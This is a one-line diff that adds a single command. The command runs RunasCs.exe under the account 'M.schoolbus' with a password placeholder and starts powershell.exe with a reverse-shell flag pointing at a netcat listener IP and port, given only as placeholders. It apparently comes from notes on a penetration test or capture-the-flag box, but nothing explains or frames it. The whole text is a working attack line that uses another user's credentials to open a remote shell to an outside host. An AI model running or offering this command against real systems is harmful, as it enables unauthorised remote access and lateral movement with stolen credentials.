@@ -1,0 +1,1 @@
+./RunasCs.exe 'M.schoolbus' '<password>' powershell.exe -r <nc_IP>:<nc_Port>
